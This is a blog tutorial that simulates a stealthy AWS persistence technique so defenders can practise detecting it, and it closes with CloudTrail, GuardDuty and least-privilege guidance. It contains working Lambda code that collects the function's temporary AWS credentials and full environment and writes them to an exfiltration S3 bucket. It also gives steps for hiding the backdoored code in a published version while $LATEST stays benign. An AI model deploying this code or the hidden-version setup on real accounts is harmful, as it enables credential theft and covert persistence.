---
title: Stealthy Persistence in AWS - A Practical Simulation for Defenders
date: 2025-06-27
author: Sergio Jimenez
tags:
  - backdoor
  - persistence
  - lambda 
---

-----

## Stealthy Persistence in AWS: A Practical Simulation for Defenders

In the world of cloud cybersecurity, attackers are always innovating. As defenders, it's crucial not only to understand attack techniques but also to **simulate them to strengthen our own defenses**. Recently, an analysis from Datadog and insights from a security analyst Eduard Agavriloae  shed light on a particularly cunning persistence technique in AWS: the use of **API Gateway and Lambda Functions for credential exfiltration**, with a "twist" that makes it even harder to detect.

This article breaks down how an attacker might implement this technique and, more importantly, **how we can simulate it in our own environment** to fine-tune our detection and prevention capabilities.

-----

### The Technique in Detail: API Gateway + Lambda for Credential Exfiltration

Datadog's original idea involved a compromised Lambda creating new IAM users for persistence. However, the "twist" that interests us is the **exfiltration of credentials from the Lambda's own execution environment (`/proc/self/environ`)**. This is stealthier because an attacker can use these exfiltrated credentials to operate from their own infrastructure, avoiding detections associated with creating new users (a highly monitored API call).

Persistence is achieved by linking this "malicious" Lambda to an **API Gateway**, creating a web entry point that the attacker can invoke at will. The subtlety is amplified by **Lambda versioning**: an attacker could deploy a "benign" version of the function as `$LATEST` (the one administrators typically check), while the "backdoored" version (with the exfiltration code) is explicitly invoked by its version number, thus remaining hidden from superficial inspections.

-----

### Setting Up the Attack Scenario: Step-by-Step Simulation

To understand and defend ourselves, we'll replicate this technique in a controlled AWS environment.

#### 1\. Preparing the AWS Ground

Before we start, security is key. Don't use your `root` account or an administrator user.

  * **Test IAM User:** Create an IAM user with the minimum necessary permissions to **create Lambda functions, API Gateways, and IAM roles**. This simulates an initial compromise with limited privileges.
  * **S3 Bucket for the "Catch":** You'll need an **S3 bucket** where the "malicious" Lambda will deposit the exfiltrated credentials. Ensure the bucket policy only allows writes from the IAM role your Lambda will assume.

#### 2\. The "Malicious" Lambda: Code and Role

This is the heart of our simulated attack. This function will read environment variables, which in Lambda include temporary credentials.

  * **Lambda Python Code:**

    ```python
    import os
    import json
    import boto3

    def lambda_handler(event, context):
        try:
            # Read environment variables, which in Lambda include temporary credentials
            environ_data = os.environ # os.environ is already a dict, no need to read from /proc/self/environ directly here for this purpose.

            # Extract specific credentials (if they exist)
            aws_access_key_id = environ_data.get('AWS_ACCESS_KEY_ID', 'N/A')
            aws_secret_access_key = environ_data.get('AWS_SECRET_ACCESS_KEY', 'N/A')
            aws_session_token = environ_data.get('AWS_SESSION_TOKEN', 'N/A')
            
            exfiltrated_data = {
                "lambda_name": context.function_name,
                "aws_access_key_id": aws_access_key_id,
                "aws_secret_access_key": aws_secret_access_key,
                "aws_session_token": aws_session_token,
                "full_environ": dict(environ_data) # Convert to dict for JSON serialization
            }

            # Send data to S3
            s3_bucket_name = "your-exfiltration-bucket" # IMPORTANT: Change this to your bucket name!
            s3_key = f"exfiltrated-creds/{context.aws_request_id}.json"
            s3_client = boto3.client('s3')
            s3_client.put_object(
                Bucket=s3_bucket_name,
                Key=s3_key,
                Body=json.dumps(exfiltrated_data, indent=4)
            )

            print(f"Credentials exfiltrated and saved to s3://{s3_bucket_name}/{s3_key}")
            
            return {
                'statusCode': 200,
                'body': json.dumps('Data exfiltrated successfully!')
            }
        except Exception as e:
            print(f"Error during exfiltration: {e}")
            return {
                'statusCode': 500,
                'body': json.dumps(f'Error during exfiltration: {str(e)}')
            }
    ```

  * **Lambda Execution Role (IAM Role):** This role must have permissions for:

      * `lambda:InvokeFunction`
      * `s3:PutObject` in *your* exfiltration bucket.
      * Basic **CloudWatch Logs** permissions (`logs:CreateLogGroup`, `logs:CreateLogStream`, `logs:PutLogEvents`).

#### 3\. The API Gateway Deception

The API Gateway is the public facade the attacker will use.

  * **Create HTTP API:** In the API Gateway console, create a simple **HTTP API**.
  * **Resource and Method:** Define a resource (e.g., `/backdoor`) and an HTTP method (e.g., `GET`).
  * **Lambda Integration:** Connect this method to your Lambda function. Ensure API Gateway has the permissions to invoke it.

#### 4\. The Key to Stealth: Lambda Versions

This is where the attacker's ingenuity comes in.

  * **"$LATEST" Version (Benign):** Upload a "clean" version of your Lambda that does something innocuous (e.g., "Hello World"). This will be the one pointed to by the `$LATEST` alias.
  * **"Backdoored" Version (Malicious):** Now, **update your Lambda's code with the credential exfiltration script**. Publish a **new version** of this function (e.g., `v2`). The key is that the attacker will explicitly invoke `arn:aws:lambda:region:account-id:function:MyFunction:v2`, while your security team might only be checking `$LATEST`.

#### 5\. Time to Invoke the Backdoor\!

  * **"Normal" Invocation:** Access the API Gateway URL without specifying a version. It should execute the `$LATEST` (benign) version.
  * **"Malicious" Invocation:** The attacker will invoke the function by specifying the backdoored version in the ARN. For example: `arn:aws:lambda:us-east-1:123456789012:function:MyFunction:v2`. After execution, you should find a JSON file with the exfiltrated credentials in your S3 bucket.

-----

### Defense and Detection: Hardening Your Environment

Once you've simulated the attack, it's time to put on your "Blue Team" hat and strengthen your defenses.

#### Monitoring and Detection (Red Flags)

  * **AWS CloudTrail:** Your best friend.
      * **Resource Creation/Modification:** Look for events like `CreateFunction`, `UpdateFunctionCode`, `PublishVersion` (for Lambdas) or `CreateRestApi`, `CreateResource`, `PUT_INTEGRATION` (for API Gateway). **Abnormalities in these events are red flags.**
      * **Exfiltration:** Monitor `PutObject` in S3, especially if you don't expect a Lambda to write to a specific bucket.
      * **Use of Exfiltrated Credentials:** `AssumeRole` or `GetFederationToken` events from **unusual IPs** or with **suspicious credentials** (the exfiltrated ones) are critical.
  * **CloudWatch Lambda Logs:** Set up alerts for execution errors or unusual patterns in your function logs. If the malicious Lambda tries to write to S3 unsuccessfully (thanks to strict policies\!), your logs will tell you.
  * **Amazon GuardDuty:** Enable it. It detects malicious activity, including unusual credential usage, communications with suspicious IPs, and exfiltration attempts.
  * **Lambda Version Monitoring:** **Crucial for this attack.** Don't just limit yourself to `$LATEST`. Use CloudWatch Lambda metrics to see **invocations by version**. If an old or "inactive" version suddenly shows invocation activity, investigate\!
  * **AWS Security Hub:** Centralizes security findings from all your services, giving you a holistic view.

#### Prevention (Blue Fortress)

  * **Principle of Least Privilege:** The golden rule. Grant your Lambdas only the absolutely necessary permissions. If a Lambda doesn't need to write to S3, don't give it `s3:PutObject` permissions\!
  * **Code Review and Secure CI/CD:** Implement security scanning (SAST) in your CI/CD pipelines to detect malicious code or vulnerabilities before deployment. Conduct regular code reviews.
  * **Credential Management:** Rotate credentials frequently and **never hardcode credentials in your code**. Leverage IAM roles and temporary credentials that Lambda already provides.
  * **API Gateway Configuration:**
      * Restric access with **Authorizers** (Lambda Authorizers, Cognito, IAM).
      * Use **AWS WAF** to protect your API Gateway from common attacks.
  * **Network Security (VPC):** If feasible, place your Lambdas inside a VPC to control network traffic more granularly with Security Groups and NACLs.
  * **AWS Organizations SCPs:** If you use AWS Organizations, Service Control Policies (SCPs) can prevent dangerous actions at the account level, acting as an additional barrier.
  * **Offensive Mindset:** Finally, and perhaps most importantly, cultivate an **offensive mindset** within your team. Understanding how attackers think and operate will enable you to build more robust and proactive defenses.

-----

Simulating these sophisticated persistence techniques isn't just a technical exercise; it's an invaluable investment in your ability to protect your AWS environments. By understanding the "how" of the attack, you'll be much better equipped to build the "how" of your defense.


-----
Sources:
- https://www.linkedin.com/in/eduard-k-agavriloae/
- https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-the-attacker-doth-persist-too-much/
